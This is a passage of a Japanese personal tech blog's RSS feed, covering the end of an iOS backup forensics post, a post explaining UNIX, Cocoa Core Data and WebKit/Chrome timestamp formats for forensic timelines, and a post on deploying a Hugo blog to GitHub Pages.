&lt;p&gt;iExplorerは、高機能なiOSデバイスファイルブラウザーです。&lt;a href=&#34;https://macroplant.com/iexplorer&#34;&gt;iExplorer&lt;/a&gt; よりダウンロードできます。iExplorerは、Manifest.dbなどの情報を自動でパースし、より人間にわかりやすい形で表示してくれます。正直これがあれば、バックアップデータの閲覧には困らないと思います。全体的に眺めたい際などは、こちらを使って足りない場合、前述した&lt;code&gt;plutil&lt;/code&gt;コマンドなどを使って解析します。同様のツールとして&lt;code&gt;iBackupBot&lt;/code&gt;や&lt;code&gt;iBackup Viewer&lt;/code&gt;などがあるので、使い比べてみて自分にあったものを使うと良いでしょう。&lt;/p&gt;

&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;p&gt;今回は、iOSの基本構造やバックアップデータを用いた解析方法などについて簡単にご紹介しました。次は、気が向けば個々のアーティファクトについてより詳細にとりあげて記事を今度書こうかなと思っています。&lt;/p&gt;

&lt;h2 id=&#34;参考資料&#34;&gt;参考資料&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.packtpub.com/networking-and-servers/practical-mobile-forensics-third-edition&#34;&gt;Practical Mobile Forensics - Third Edition&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>フォレンジックのためのシステム時刻入門</title>
      <link>https://owlinux1000.github.io/blog/post/system_time_for_forensics/</link>
      <pubDate>Sat, 23 Feb 2019 20:37:24 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/system_time_for_forensics/</guid>
      <description>

&lt;ul&gt;
&lt;li&gt;フォレンジックなどをやっていると様々な時刻形式と直面することがあります。いざ調べてみると時刻形式は、プラットフォームによって異なる場合が多いことに気づきました。時刻の情報はタイムライン作成では、とても重要な要因となってくるので、適切に時刻を解釈することが必要です。本記事では、よく見る3つの時刻表記についてご紹介します。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;unix-time&#34;&gt;UNIX time&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;UNIX timeはDFIRだけに限らず多くの場面でよく見かける時刻形式の1つです。&lt;strong&gt;UTC（協定世界時）の1970年1月1日0時0分0秒からの経過秒数&lt;/strong&gt;で表す時刻形式です。主要なプログラミング言語の代表的な時刻を扱うライブラリなどでは、UNIX timeをサポートしています。例えばRubyでは以下の様に、UNIX timeを扱うことができます。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;time&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#800&#34;&gt;JST_OFFSET&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;3600&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;9&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Time&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;parse(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1970-01-01 00:00:00&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_i &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;JST_OFFSET&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#=&amp;gt; 0&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Time&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;at(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#=&amp;gt; 1970-01-01 09:00:00 +0900&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;apple-cocoa-core-data-timestamp&#34;&gt;Apple Cocoa Core Data timestamp&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Apple Cocoa Core Data timestampは、主にMac OSやiOSで見かける時刻形式です。Cocoaとは、macOS用のフレームワークです。また、&lt;strong&gt;Mac absolute time&lt;/strong&gt;と表記されることもあります。本時刻形式は、&lt;strong&gt;UTCの2001年1月1日0時0分0秒からの経過秒数&lt;/strong&gt;で表す時刻形式です。UNIX timeとの差分は、&lt;strong&gt;978307200&lt;/strong&gt;なので、これを考慮すればUNIX timeからすぐ算出することができます。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;webkit-chrome-time&#34;&gt;WebKit/Chrome time&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;WebKit/Chrome timeは、Google Chrome、OperaやSafariなどのデータで使われている時刻形式です。本時刻形式は、&lt;strong&gt;UTCの1601年1月1日0時0分0秒からの経過マイクロ秒&lt;/strong&gt;で表す時刻形式です。UNIX timeなどと異なりマイクロ秒なので値が大きいという特徴があります。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;便利なツールやサイト&#34;&gt;便利なツールやサイト&lt;/h2&gt;

&lt;p&gt;以下の2つは、システム時刻変換をする際に、使いやすかったツールです。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.epochconverter.com/&#34;&gt;Epoch Converter&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;本記事で説明した時刻形式などは概ねカバーしているツールです&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.digital-detective.net/dcode/&#34;&gt;DCode&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Epoch Converterと同様の機能を有しているWindowsアプリケーション&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;参考文献&#34;&gt;参考文献&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.packtpub.com/networking-and-servers/practical-mobile-forensics-third-edition&#34;&gt;Practical Mobile Forensics - Third Edition&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>新年なのでHugo でGitHub Pages にデプロイ</title>
      <link>https://owlinux1000.github.io/blog/post/helloworld/</link>
      <pubDate>Wed, 02 Jan 2019 22:27:14 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/helloworld/</guid>
      <description>

&lt;ul&gt;
&lt;li&gt;あけましておめでとうございます。本年もよろしくお願いいたします。&lt;br /&gt;
新年なので、Hugo で技術ブログを作成してみました。私ははてなブログやMedium などいろいろサイトを持っているわけですが、このブログには自分の備忘録的なことを書いて行こうと思います。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;1-hugo-のインストールと事前準備&#34;&gt;1. Hugo のインストールと事前準備&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;まずはHugo をインストールし、使いたいテーマ(今回はoneというテーマ)をsubmoduleとして取り込む。今回は、GitHub に&lt;code&gt;blog&lt;/code&gt; というリポジトリを作成(アクセスする際には、&lt;code&gt;https://owlinux1000.github.io/blog/&lt;/code&gt;) して、GitHubの設定で &lt;strong&gt;masterブランチのdocs/&lt;/strong&gt; を公開対象として設定する。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;config.toml&lt;/code&gt; を編集する際には、&lt;code&gt;publishDir = &amp;quot;docs&amp;quot;&lt;/code&gt; を追加しておく。これはGitHub 側で公開するディレクトリを&lt;code&gt;docs&lt;/code&gt; にしているから。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ brew install hugo
$ hugo new site blog
$ cd blog
$ git init
$ cd themes
$ git submodule add https://github.com/resugary/hugo-theme-one one
$ cp one/exampleSite/config.toml ../../../
$ emacs config.toml # 適宜パラメータを修正する&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;2-記事作成&#34;&gt;2. 記事作成&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;hugo コマンドで記事を作成してまずは、server サブコマンドを使ってPreview を見てみる。大丈夫そうならGitHub にpushする&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;$ hugo new posts/helloworld &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# この記事&lt;/span&gt;
$ emacs content/posts/helloworld.md &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# draft: false に変更&lt;/span&gt;
$ hugo &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Webページを生成。これでdocsに吐かれる&lt;/span&gt;
$ hugo server &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# アクセスして見れるか確認する&lt;/span&gt;
$ git add .
$ git commit -m &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1st commit!&amp;#34;&lt;/span&gt;
$ git remote add origin git@github.com:owlinux1000/blog.git
$ git push -u origin master&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Hugo を初めて使ってみた感想として結構めんどくさくなかったと思った。ネット上見てるとCIでがんばったりいろいろ見ていたので、プロジェクトサイトでのデプロイにした。毎月1本程度では継続していきたい。&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
  </channel>
</rss>